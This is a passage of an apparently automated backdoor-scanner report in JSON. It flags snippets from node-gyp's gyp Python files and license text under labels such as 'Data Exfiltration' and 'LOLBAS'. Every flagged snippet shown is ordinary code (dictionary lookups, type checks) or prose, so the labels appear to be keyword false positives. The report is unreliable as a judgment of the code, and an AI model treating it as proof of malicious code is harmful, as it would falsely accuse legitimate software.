                    "text": "                # wildcard.\n                dependency_target_dicts = data[dependency_build_file][\"targets\"]\n                for dependency_target_dict in dependency_target_dicts:\n                    if int(dependency_target_dict.get(\"suppress_wildcard\", False)):\n                        continue\n                    dependency_target_name = dependency_target_dict[\"target_name\"]\n                    if (\n",
                    "rendered": {
                      "text": "                # wildcard.\n                dependency_target_dicts = data[dependency_build_file][\"targets\"]\n                for dependency_target_dict in dependency_target_dicts:\n                    if int(dependency_target_dict.get(\"suppress_wildcard\", False)):\n                        continue\n                    dependency_target_name = dependency_target_dict[\"target_name\"]\n                    if (\n",
                      "markdown": "`                # wildcard.\n                dependency_target_dicts = data[dependency_build_file][\"targets\"]\n                for dependency_target_dict in dependency_target_dicts:\n                    if int(dependency_target_dict.get(\"suppress_wildcard\", False)):\n                        continue\n                    dependency_target_name = dependency_target_dict[\"target_name\"]\n                    if (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1535,
                  "startColumn": 38,
                  "endLine": 1535,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    for target, target_dict in targets.items():\n        target_build_file = gyp.common.BuildFile(target)\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n\n            # Loop this way instead of \"for dependency in\" or \"for index in range\"\n            # because the dependencies list will be modified within the loop body.\n",
                    "rendered": {
                      "text": "    for target, target_dict in targets.items():\n        target_build_file = gyp.common.BuildFile(target)\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n\n            # Loop this way instead of \"for dependency in\" or \"for index in range\"\n            # because the dependencies list will be modified within the loop body.\n",
                      "markdown": "`    for target, target_dict in targets.items():\n        target_build_file = gyp.common.BuildFile(target)\n        for dependency_key in dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n\n            # Loop this way instead of \"for dependency in\" or \"for index in range\"\n            # because the dependencies list will be modified within the loop body.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1486,
                  "startColumn": 38,
                  "endLine": 1486,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        target_build_file = gyp.common.BuildFile(target)\n        toolset = target_dict[\"toolset\"]\n        for dependency_key in all_dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            for index, dep in enumerate(dependencies):\n                dep_file, dep_target, dep_toolset = gyp.common.ResolveTarget(\n                    target_build_file, dep, toolset\n",
                    "rendered": {
                      "text": "        target_build_file = gyp.common.BuildFile(target)\n        toolset = target_dict[\"toolset\"]\n        for dependency_key in all_dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            for index, dep in enumerate(dependencies):\n                dep_file, dep_target, dep_toolset = gyp.common.ResolveTarget(\n                    target_build_file, dep, toolset\n",
                      "markdown": "`        target_build_file = gyp.common.BuildFile(target)\n        toolset = target_dict[\"toolset\"]\n        for dependency_key in all_dependency_sections:\n            dependencies = target_dict.get(dependency_key, [])\n            for index, dep in enumerate(dependencies):\n                dep_file, dep_target, dep_toolset = gyp.common.ResolveTarget(\n                    target_build_file, dep, toolset\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1456,
                  "startColumn": 38,
                  "endLine": 1456,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\n    targets = {}\n    for build_file in data[\"target_build_files\"]:\n        for target in data[build_file].get(\"targets\", []):\n            target_name = gyp.common.QualifiedTarget(\n                build_file, target[\"target_name\"], target[\"toolset\"]\n            )\n",
                    "rendered": {
                      "text": "\n    targets = {}\n    for build_file in data[\"target_build_files\"]:\n        for target in data[build_file].get(\"targets\", []):\n            target_name = gyp.common.QualifiedTarget(\n                build_file, target[\"target_name\"], target[\"toolset\"]\n            )\n",
                      "markdown": "`\n    targets = {}\n    for build_file in data[\"target_build_files\"]:\n        for target in data[build_file].get(\"targets\", []):\n            target_name = gyp.common.QualifiedTarget(\n                build_file, target[\"target_name\"], target[\"toolset\"]\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1267,
                  "startColumn": 30,
                  "endLine": 1267,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    # the_dict in the_dict's parent dict.  If the_dict's parent is not a dict\n    # (it could be a list or it could be parentless because it is a root dict),\n    # the_dict_key will be None.\n    for key, value in the_dict.get(\"variables\", {}).items():\n        if type(value) not in (str, int, list):\n            continue\n\n",
                    "rendered": {
                      "text": "    # the_dict in the_dict's parent dict.  If the_dict's parent is not a dict\n    # (it could be a list or it could be parentless because it is a root dict),\n    # the_dict_key will be None.\n    for key, value in the_dict.get(\"variables\", {}).items():\n        if type(value) not in (str, int, list):\n            continue\n\n",
                      "markdown": "`    # the_dict in the_dict's parent dict.  If the_dict's parent is not a dict\n    # (it could be a list or it could be parentless because it is a root dict),\n    # the_dict_key will be None.\n    for key, value in the_dict.get(\"variables\", {}).items():\n        if type(value) not in (str, int, list):\n            continue\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 914,
                  "startColumn": 49,
                  "endLine": 914,
                  "endColumn": 54,
                  "snippet": {
                    "text": "            # arises, the syntax should be extended to support no caching off a\n            # command's output so it is run every time.\n            cache_key = (str(contents), build_file_dir)\n            cached_value = cached_command_results.get(cache_key, None)\n            if cached_value is None:\n                gyp.DebugOutput(\n                    gyp.DEBUG_VARIABLES,\n",
                    "rendered": {
                      "text": "            # arises, the syntax should be extended to support no caching off a\n            # command's output so it is run every time.\n            cache_key = (str(contents), build_file_dir)\n            cached_value = cached_command_results.get(cache_key, None)\n            if cached_value is None:\n                gyp.DebugOutput(\n                    gyp.DEBUG_VARIABLES,\n",
                      "markdown": "`            # arises, the syntax should be extended to support no caching off a\n            # command's output so it is run every time.\n            cache_key = (str(contents), build_file_dir)\n            cached_value = cached_command_results.get(cache_key, None)\n            if cached_value is None:\n                gyp.DebugOutput(\n                    gyp.DEBUG_VARIABLES,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 336,
                  "startColumn": 33,
                  "endLine": 336,
                  "endColumn": 38,
                  "snippet": {
                    "text": "                new_target_list.append(target)\n                continue\n            if multiple_toolsets:\n                toolsets = target.get(\"toolsets\", [\"target\"])\n            else:\n                toolsets = [\"target\"]\n            # Make sure this 'toolsets' definition is only processed once.\n",
                    "rendered": {
                      "text": "                new_target_list.append(target)\n                continue\n            if multiple_toolsets:\n                toolsets = target.get(\"toolsets\", [\"target\"])\n            else:\n                toolsets = [\"target\"]\n            # Make sure this 'toolsets' definition is only processed once.\n",
                      "markdown": "`                new_target_list.append(target)\n                continue\n            if multiple_toolsets:\n                toolsets = target.get(\"toolsets\", [\"target\"])\n            else:\n                toolsets = [\"target\"]\n            # Make sure this 'toolsets' definition is only processed once.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 166,
                  "startColumn": 56,
                  "endLine": 166,
                  "endColumn": 61,
                  "snippet": {
                    "text": "\n    included.append(build_file_path)\n\n    for included_build_file in aux_data[build_file_path].get(\"included\", []):\n        GetIncludedBuildFiles(included_build_file, aux_data, included)\n\n    return included\n",
                    "rendered": {
                      "text": "\n    included.append(build_file_path)\n\n    for included_build_file in aux_data[build_file_path].get(\"included\", []):\n        GetIncludedBuildFiles(included_build_file, aux_data, included)\n\n    return included\n",
                      "markdown": "`\n    included.append(build_file_path)\n\n    for included_build_file in aux_data[build_file_path].get(\"included\", []):\n        GetIncludedBuildFiles(included_build_file, aux_data, included)\n\n    return included\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2816,
                  "startColumn": 18,
                  "endLine": 2816,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    environment = run_as.get(\"environment\")\n    if environment and type(environment) is not dict:\n        raise GypError(\n            \"The 'environment' for 'run_as' in target %s \"\n            \"in file %s should be a dictionary.\" % (target_name, build_file)\n        )\n\n",
                    "rendered": {
                      "text": "    environment = run_as.get(\"environment\")\n    if environment and type(environment) is not dict:\n        raise GypError(\n            \"The 'environment' for 'run_as' in target %s \"\n            \"in file %s should be a dictionary.\" % (target_name, build_file)\n        )\n\n",
                      "markdown": "`    environment = run_as.get(\"environment\")\n    if environment and type(environment) is not dict:\n        raise GypError(\n            \"The 'environment' for 'run_as' in target %s \"\n            \"in file %s should be a dictionary.\" % (target_name, build_file)\n        )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2813,
                  "startColumn": 4,
                  "endLine": 2813,
                  "endColumn": 28,
                  "snippet": {
                    "text": "            \"The 'working_directory' for 'run_as' in target %s \"\n            \"in file %s should be a string.\" % (target_name, build_file)\n        )\n    environment = run_as.get(\"environment\")\n    if environment and type(environment) is not dict:\n        raise GypError(\n            \"The 'environment' for 'run_as' in target %s \"\n",
                    "rendered": {
                      "text": "            \"The 'working_directory' for 'run_as' in target %s \"\n            \"in file %s should be a string.\" % (target_name, build_file)\n        )\n    environment = run_as.get(\"environment\")\n    if environment and type(environment) is not dict:\n        raise GypError(\n            \"The 'environment' for 'run_as' in target %s \"\n",
                      "markdown": "`            \"The 'working_directory' for 'run_as' in target %s \"\n            \"in file %s should be a string.\" % (target_name, build_file)\n        )\n    environment = run_as.get(\"environment\")\n    if environment and type(environment) is not dict:\n        raise GypError(\n            \"The 'environment' for 'run_as' in target %s \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/tags.py"
                },
                "region": {
                  "startLine": 192,
                  "startColumn": 33,
                  "endLine": 192,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    the 'none' ABItag will be used.\n\n    If 'abi3' or 'none' are specified in 'abis' then they will be yielded at\n    their normal position and not at the beginning.\n    \"\"\"\n    if not python_version:\n        python_version = sys.version_info[:2]\n",
                    "rendered": {
                      "text": "    the 'none' ABItag will be used.\n\n    If 'abi3' or 'none' are specified in 'abis' then they will be yielded at\n    their normal position and not at the beginning.\n    \"\"\"\n    if not python_version:\n        python_version = sys.version_info[:2]\n",
                      "markdown": "`    the 'none' ABItag will be used.\n\n    If 'abi3' or 'none' are specified in 'abis' then they will be yielded at\n    their normal position and not at the beginning.\n    \"\"\"\n    if not python_version:\n        python_version = sys.version_info[:2]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/tags.py"
                },
                "region": {
                  "startLine": 191,
                  "startColumn": 73,
                  "endLine": 192,
                  "snippet": {
                    "text": "    If python_version only specifies a major version then user-provided ABIs and\n    the 'none' ABItag will be used.\n\n    If 'abi3' or 'none' are specified in 'abis' then they will be yielded at\n    their normal position and not at the beginning.\n    \"\"\"\n    if not python_version:\n        python_version = sys.version_info[:2]\n",
                    "rendered": {
                      "text": "    If python_version only specifies a major version then user-provided ABIs and\n    the 'none' ABItag will be used.\n\n    If 'abi3' or 'none' are specified in 'abis' then they will be yielded at\n    their normal position and not at the beginning.\n    \"\"\"\n    if not python_version:\n        python_version = sys.version_info[:2]\n",
                      "markdown": "`    If python_version only specifies a major version then user-provided ABIs and\n    the 'none' ABItag will be used.\n\n    If 'abi3' or 'none' are specified in 'abis' then they will be yielded at\n    their normal position and not at the beginning.\n    \"\"\"\n    if not python_version:\n        python_version = sys.version_info[:2]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/tags.py"
                },
                "region": {
                  "startLine": 58,
                  "startColumn": 83,
                  "endLine": 59,
                  "snippet": {
                    "text": "        self._interpreter = interpreter.lower()\n        self._abi = abi.lower()\n        self._platform = platform.lower()\n        # The __hash__ of every single element in a Set[Tag] will be evaluated each time\n        # that a set calls its `.disjoint()` method, which may be called hundreds of\n        # times when scanning a page of links for packages with tags matching that\n        # Set[Tag]. Pre-computing the value here produces significant speedups for\n        # downstream consumers.\n",
                    "rendered": {
                      "text": "        self._interpreter = interpreter.lower()\n        self._abi = abi.lower()\n        self._platform = platform.lower()\n        # The __hash__ of every single element in a Set[Tag] will be evaluated each time\n        # that a set calls its `.disjoint()` method, which may be called hundreds of\n        # times when scanning a page of links for packages with tags matching that\n        # Set[Tag]. Pre-computing the value here produces significant speedups for\n        # downstream consumers.\n",
                      "markdown": "`        self._interpreter = interpreter.lower()\n        self._abi = abi.lower()\n        self._platform = platform.lower()\n        # The __hash__ of every single element in a Set[Tag] will be evaluated each time\n        # that a set calls its `.disjoint()` method, which may be called hundreds of\n        # times when scanning a page of links for packages with tags matching that\n        # Set[Tag]. Pre-computing the value here produces significant speedups for\n        # downstream consumers.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/tags.py"
                },
                "region": {
                  "startLine": 514,
                  "startColumn": 34,
                  "endLine": 514,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    be returned when appropriate.\n    \"\"\"\n    name = sys.implementation.name\n    return INTERPRETER_SHORT_NAMES.get(name) or name\n\n\ndef interpreter_version(*, warn: bool = False) -> str:\n",
                    "rendered": {
                      "text": "    be returned when appropriate.\n    \"\"\"\n    name = sys.implementation.name\n    return INTERPRETER_SHORT_NAMES.get(name) or name\n\n\ndef interpreter_version(*, warn: bool = False) -> str:\n",
                      "markdown": "`    be returned when appropriate.\n    \"\"\"\n    name = sys.implementation.name\n    return INTERPRETER_SHORT_NAMES.get(name) or name\n\n\ndef interpreter_version(*, warn: bool = False) -> str:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/tags.py"
                },
                "region": {
                  "startLine": 483,
                  "startColumn": 44,
                  "endLine": 483,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        elif linux == \"linux_aarch64\":\n            linux = \"linux_armv8l\"\n    _, arch = linux.split(\"_\", 1)\n    archs = {\"armv8l\": [\"armv8l\", \"armv7l\"]}.get(arch, [arch])\n    yield from _manylinux.platform_tags(archs)\n    yield from _musllinux.platform_tags(archs)\n    for arch in archs:\n",
                    "rendered": {
                      "text": "        elif linux == \"linux_aarch64\":\n            linux = \"linux_armv8l\"\n    _, arch = linux.split(\"_\", 1)\n    archs = {\"armv8l\": [\"armv8l\", \"armv7l\"]}.get(arch, [arch])\n    yield from _manylinux.platform_tags(archs)\n    yield from _musllinux.platform_tags(archs)\n    for arch in archs:\n",
                      "markdown": "`        elif linux == \"linux_aarch64\":\n            linux = \"linux_armv8l\"\n    _, arch = linux.split(\"_\", 1)\n    archs = {\"armv8l\": [\"armv8l\", \"armv7l\"]}.get(arch, [arch])\n    yield from _manylinux.platform_tags(archs)\n    yield from _musllinux.platform_tags(archs)\n    for arch in archs:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/metadata.py"
                },
                "region": {
                  "startLine": 201,
                  "startColumn": 24,
                  "endLine": 201,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        # *something* reasonable with malformed data.\n        #\n        # The main thing that we have to worry about, is data that does\n        # not have a ',' at all to split the label from the Value. There\n        # isn't a singular right answer here, and we will fail validation\n        # later on (if the caller is validating) so it doesn't *really*\n        # matter, but since the missing value has to be an empty str\n",
                    "rendered": {
                      "text": "        # *something* reasonable with malformed data.\n        #\n        # The main thing that we have to worry about, is data that does\n        # not have a ',' at all to split the label from the Value. There\n        # isn't a singular right answer here, and we will fail validation\n        # later on (if the caller is validating) so it doesn't *really*\n        # matter, but since the missing value has to be an empty str\n",
                      "markdown": "`        # *something* reasonable with malformed data.\n        #\n        # The main thing that we have to worry about, is data that does\n        # not have a ',' at all to split the label from the Value. There\n        # isn't a singular right answer here, and we will fail validation\n        # later on (if the caller is validating) so it doesn't *really*\n        # matter, but since the missing value has to be an empty str\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/metadata.py"
                },
                "region": {
                  "startLine": 601,
                  "startColumn": 28,
                  "endLine": 601,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            )\n\n        markdown_variants = {\"GFM\", \"CommonMark\"}\n        variant = parameters.get(\"variant\", \"GFM\")  # Use an acceptable default.\n        if content_type == \"text/markdown\" and variant not in markdown_variants:\n            raise self._invalid_metadata(\n                f\"valid Markdown variants for {{field}} are {list(markdown_variants)}, \"\n",
                    "rendered": {
                      "text": "            )\n\n        markdown_variants = {\"GFM\", \"CommonMark\"}\n        variant = parameters.get(\"variant\", \"GFM\")  # Use an acceptable default.\n        if content_type == \"text/markdown\" and variant not in markdown_variants:\n            raise self._invalid_metadata(\n                f\"valid Markdown variants for {{field}} are {list(markdown_variants)}, \"\n",
                      "markdown": "`            )\n\n        markdown_variants = {\"GFM\", \"CommonMark\"}\n        variant = parameters.get(\"variant\", \"GFM\")  # Use an acceptable default.\n        if content_type == \"text/markdown\" and variant not in markdown_variants:\n            raise self._invalid_metadata(\n                f\"valid Markdown variants for {{field}} are {list(markdown_variants)}, \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/metadata.py"
                },
                "region": {
                  "startLine": 594,
                  "startColumn": 28,
                  "endLine": 594,
                  "endColumn": 33,
                  "snippet": {
                    "text": "                f\"{{field}} must be one of {list(content_types)}, not {value!r}\"\n            )\n\n        charset = parameters.get(\"charset\", \"UTF-8\")\n        if charset != \"UTF-8\":\n            raise self._invalid_metadata(\n                f\"{{field}} can only specify the UTF-8 charset, not {list(charset)}\"\n",
                    "rendered": {
                      "text": "                f\"{{field}} must be one of {list(content_types)}, not {value!r}\"\n            )\n\n        charset = parameters.get(\"charset\", \"UTF-8\")\n        if charset != \"UTF-8\":\n            raise self._invalid_metadata(\n                f\"{{field}} can only specify the UTF-8 charset, not {list(charset)}\"\n",
                      "markdown": "`                f\"{{field}} must be one of {list(content_types)}, not {value!r}\"\n            )\n\n        charset = parameters.get(\"charset\", \"UTF-8\")\n        if charset != \"UTF-8\":\n            raise self._invalid_metadata(\n                f\"{{field}} can only specify the UTF-8 charset, not {list(charset)}\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/metadata.py"
                },
                "region": {
                  "startLine": 511,
                  "startColumn": 29,
                  "endLine": 511,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        # No need to check the cache as attribute lookup will resolve into the\n        # instance's __dict__ before __get__ is called.\n        cache = instance.__dict__\n        value = instance._raw.get(self.name)\n\n        # To make the _process_* methods easier, we'll check if the value is None\n        # and if this field is NOT a required attribute, and if both of those\n",
                    "rendered": {
                      "text": "        # No need to check the cache as attribute lookup will resolve into the\n        # instance's __dict__ before __get__ is called.\n        cache = instance.__dict__\n        value = instance._raw.get(self.name)\n\n        # To make the _process_* methods easier, we'll check if the value is None\n        # and if this field is NOT a required attribute, and if both of those\n",
                      "markdown": "`        # No need to check the cache as attribute lookup will resolve into the\n        # instance's __dict__ before __get__ is called.\n        cache = instance.__dict__\n        value = instance._raw.get(self.name)\n\n        # To make the _process_* methods easier, we'll check if the value is None\n        # and if this field is NOT a required attribute, and if both of those\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/metadata.py"
                },
                "region": {
                  "startLine": 387,
                  "startColumn": 40,
                  "endLine": 387,
                  "endColumn": 45,
                  "snippet": {
                    "text": "            unparsed[name] = value\n            continue\n\n        raw_name = _EMAIL_TO_RAW_MAPPING.get(name)\n        if raw_name is None:\n            # This is a bit of a weird situation, we've encountered a key that\n            # we don't know what it means, so we don't know whether it's meant\n",
                    "rendered": {
                      "text": "            unparsed[name] = value\n            continue\n\n        raw_name = _EMAIL_TO_RAW_MAPPING.get(name)\n        if raw_name is None:\n            # This is a bit of a weird situation, we've encountered a key that\n            # we don't know what it means, so we don't know whether it's meant\n",
                      "markdown": "`            unparsed[name] = value\n            continue\n\n        raw_name = _EMAIL_TO_RAW_MAPPING.get(name)\n        if raw_name is None:\n            # This is a bit of a weird situation, we've encountered a key that\n            # we don't know what it means, so we don't know whether it's meant\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/LICENSE.APACHE"
                },
                "region": {
                  "startLine": 111,
                  "startColumn": 57,
                  "endLine": 111,
                  "endColumn": 61,
                  "snippet": {
                    "text": "          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n",
                    "rendered": {
                      "text": "          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n",
                      "markdown": "`          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/LICENSE.APACHE"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 60,
                  "endLine": 57,
                  "endColumn": 69,
                  "snippet": {
                    "text": "      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n",
